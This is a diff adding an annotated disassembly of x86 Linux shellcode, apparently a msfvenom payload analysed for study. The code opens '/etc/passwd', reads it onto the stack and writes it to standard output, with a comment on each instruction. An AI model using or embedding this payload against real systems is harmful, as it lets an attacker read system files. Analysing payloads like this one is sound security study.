@@ -1,0 +1,26 @@
+00000000  EB36              jmp short 0x38     ; jump to 0x38 so that we get the address of our file path
+00000002  B805000000        mov eax,0x5        ; SYS_OPEN system call
+00000007  5B                pop ebx            ; file path into EBX
+00000008  31C9              xor ecx,ecx        ; O_RDONLY flag for SYS_OPEN command
+0000000A  CD80              int 0x80           ; execute SYS_OPEN function
+0000000C  89C3              mov ebx,eax        ; move the file descriptor which we've opened into EBX.
+0000000E  B803000000        mov eax,0x3        ; SYS_READ system call
+00000013  89E7              mov edi,esp        ; Move a pointer to our buffer into EDI.
+00000015  89F9              mov ecx,edi        ; Move the pointer into ECX for the buffer argument
+00000017  BA00100000        mov edx,0x1000     ; define the size of our buffer
+0000001C  CD80              int 0x80           ; execute the READ call
+0000001E  89C2              mov edx,eax        ; Move the size of the file we read into EDX
+00000020  B804000000        mov eax,0x4        ; SYS_WRITE system call
+00000025  BB01000000        mov ebx,0x1        ; Move the FD msfvenom variable into EBX (where we will write the file to)
+0000002A  CD80              int 0x80           ; Write the contents out (this is where we see the contents!)
+0000002C  B801000000        mov eax,0x1        ; SYS_EXIT system call
+00000031  BB00000000        mov ebx,0x0        ; 0 return value
+00000036  CD80              int 0x80           ; exit cleanly
+00000038  E8C5FFFFFF        call 0x2           ; Call 0x2 so that we push the location of /etc/passwd onto the stack.
+0000003D  2F                das                ; /
+0000003E  657463            gs jz 0xa4         ; etc
+00000041  2F                das                ; /
+00000042  7061              jo 0xa5            ; pa
+00000044  7373              jnc 0xb9           ; ss
+00000046  7764              ja 0xac            ; wd
+00000048  00                db 0x00            ; null string terminator
